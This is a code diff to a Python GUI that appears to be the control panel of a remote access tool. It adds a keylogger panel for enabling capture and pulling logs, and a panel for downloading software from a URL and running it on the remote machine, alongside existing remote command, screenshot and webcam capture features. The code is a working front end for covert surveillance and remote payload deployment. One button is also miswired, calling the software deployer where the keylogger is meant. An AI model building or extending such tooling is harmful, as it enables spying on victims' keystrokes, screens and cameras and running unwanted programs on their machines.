@@ -1,6 +1,5 @@
 import tkinter
 import customtkinter
-import json
 from typing import Callable
 from PIL import Image
 import io
@@ -9,10 +8,6 @@ import os
 
 customtkinter.set_appearance_mode("dark")  # Modes: system (default), light, dark
 customtkinter.set_default_color_theme("blue")  # Themes: blue (default), dark-blue, green
-
-DEFAULT_SETTINGS = {"Command": {
-    "description": "This tool allows you to run commands on a remote server and see the output from the remote server",
-    "warnings": ""}}
 
 layouts = []
 
@@ -43,7 +38,7 @@ class commandFrame(Frame):
         self.outputBox.insert("0.0", "No Output...")
 
         self.commandTextVariable = ""
-        self.commandEntry = customtkinter.CTkEntry(self, placeholder_text="Enter Command", textvariable=self.commandTextVariable)
+        self.commandEntry = customtkinter.CTkEntry(self, placeholder_text="Enter Command")
         self.commandEntry.grid(row=3, column=0, columnspan=2, padx=(20, 0), pady=(20, 20), sticky="nsew")
 
         self.runCommandButton = customtkinter.CTkButton(master=self, text="Run Command", fg_color="transparent",
@@ -80,6 +75,44 @@ class cameraFrame(Frame):
         self.takeCapture.grid(row=1, column=0)
 
 
+# The Admin frame is not one frame
+# It consists of multiple frames
+class keyloggerFrame(Frame):
+    def __init__(self, *args, keyloggerFunc: Callable, getoutput: Callable, **kwargs):
+        super().__init__(*args, **kwargs)
+        # Tools available - Keylogger, download software, disable self
+
+        self.Title = customtkinter.CTkLabel(self, text="Keylogger Settings", font=customtkinter.CTkFont(size=15, weight="bold"))
+        self.Title.grid(row=0, column=0, padx=20, pady=10)
+        # self.keyloggerOutput = customtkinter.CTkTextbox(self)
+        # self.keyloggerOutput.grid(row=1, column=0, padx=20)
+
+        self.keyloggerToggle = customtkinter.CTkButton(self, text="Enable Keylogger", command=keyloggerFunc)
+        self.keyloggerToggle.grid(row=1, column=0, padx=10, pady=10)
+
+        self.getOutput = customtkinter.CTkButton(self, text="Get Logs", command=getoutput)
+        self.getOutput.grid(row=2, column=0, padx=10, pady=10)
+
+
+class softwareDownloaderFrame(Frame):
+    def __init__(self, *args, downloadSoftware: Callable, deploySoftware: Callable, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.Title = customtkinter.CTkLabel(self, text="Download \"Software\"", font=customtkinter.CTkFont(size=15, weight="bold"))
+        self.Title.grid(row=0, column=0, padx=(200, 20))
+
+        self.url = customtkinter.CTkEntry(self, placeholder_text="https://example.com")
+        self.url.grid(row=3, column=0, columnspan=2, padx=(20, 20), pady=(20, 20), sticky="nsew")
+
+        self.downloadButton = customtkinter.CTkButton(self, text="Download Files", command=downloadSoftware)
+        self.downloadButton.grid(row=3, column=3, padx=(0, 20))
+
+        self.runargs = customtkinter.CTkEntry(self, placeholder_text="Run Command")
+        self.runargs.grid(row=4, column=0, columnspan=2, padx=(20, 20), pady=(20, 20), sticky="nsew")
+
+        self.deployButton = customtkinter.CTkButton(self, text="Deploy Software", command=deploySoftware)
+        self.deployButton.grid(row=4, column=3, padx=(0, 20))
+
+
 # Main Application Class
 class App(customtkinter.CTk):
     def __init__(self, client) -> None:
@@ -113,12 +146,8 @@ class App(customtkinter.CTk):
         self.sidebar_button_2 = customtkinter.CTkButton(self.sidebarFrame, text="Screen Capture", command=self.switchLayoutScreenshot)
         self.sidebar_button_2.grid(row=2, column=0, padx=20, pady=10)
 
-        self.sidebar_button_3 = customtkinter.CTkButton(self.sidebarFrame, text="CameraCapture",
-                                                        command=self.switchLayoutScreenshot)
+        self.sidebar_button_3 = customtkinter.CTkButton(self.sidebarFrame, text="Admin Controls", command=self.switchLayoutAdmin)
         self.sidebar_button_3.grid(row=3, column=0, padx=20, pady=10)
-
-        self.sidebar_button_4 = customtkinter.CTkButton(self.sidebarFrame)
-        self.sidebar_button_4.grid(row=4, column=0, padx=20, pady=10)
 
         # Create main frame
         self.mainFrame = commandFrame(self, headerName="Run Commands", onsubmit=self.sendCommand)
@@ -128,6 +157,9 @@ class App(customtkinter.CTk):
         self.ssFrame = screenshotFrame(self, ontakeScreenshot=self.takeScreenshot)
         # self.ssFrame.grid(row=0, column=1, padx=20, pady=20)
         self.cameraCaptureFrame = cameraFrame(self, onCapture=self.takeCapture)
+        self.adminFrame = keyloggerFrame(self, keyloggerFunc=self.deploySoftwareWrapper, getoutput=self.getKeyloggerOutputWrapper)
+        self.downloaderFrame = softwareDownloaderFrame(self, downloadSoftware=self.downloadSoftwareWrapper, deploySoftware=self.deploySoftwareWrapper)
+
 
     # Going to start a new connection every time
     # One thread will remain open for other connection stuff
@@ -146,6 +178,11 @@ class App(customtkinter.CTk):
         self.ssFrame.grid(row=0, column=1, padx=20, pady=20)
         self.cameraCaptureFrame.grid(row=0, column=2, padx=20, pady=20)
 
+    def switchLayoutAdmin(self):
+        self.clearLayout()
+        self.adminFrame.grid(row=0, column=1, padx=20)
+        self.downloaderFrame.grid(row=1, column=1, padx=20)
+
     def clearLayout(self):
         for layout in layouts:
             layout.grid_forget()
@@ -154,7 +191,7 @@ class App(customtkinter.CTk):
     def takeScreenshot(self):
         self.client.screenshot()
         bytesScreenshot = self.client.screenshot()
-        pilscreenshot = Image.open(io.BytesIO(bytesScreenshot))
+        pilscreenshot: Image = Image.open(io.BytesIO(bytesScreenshot))
         try:
             os.mkdir("Screenshots")
         except FileExistsError:
@@ -174,6 +211,21 @@ class App(customtkinter.CTk):
         pilCapture.save(f"Captures/{time.strftime('%d-%m-%Y')}.png")
         pilCapture = pilCapture.resize((400, 200))
         self.cameraCaptureFrame.capture.configure(dark_image=pilCapture, light_image=pilCapture)
+
+    """ Wrapper functions for admin tools to allow passthrough of arguements """
+    def keyloggerDeployWrapper(self):
+        self.client.deployKeylogger()
+
+    def getKeyloggerOutputWrapper(self) -> str:
+        return self.client.getKeyloggerOutput()
+
+    def downloadSoftwareWrapper(self):
+        self.client.downloadSoftware(self.downloaderFrame.url.get())
+
+    def deploySoftwareWrapper(self):
+        self.client.deploySoftware(self.downloaderFrame.runargs.get())
+
+    """ END WRAPPERS"""
 
 
 if __name__ == "__main__":
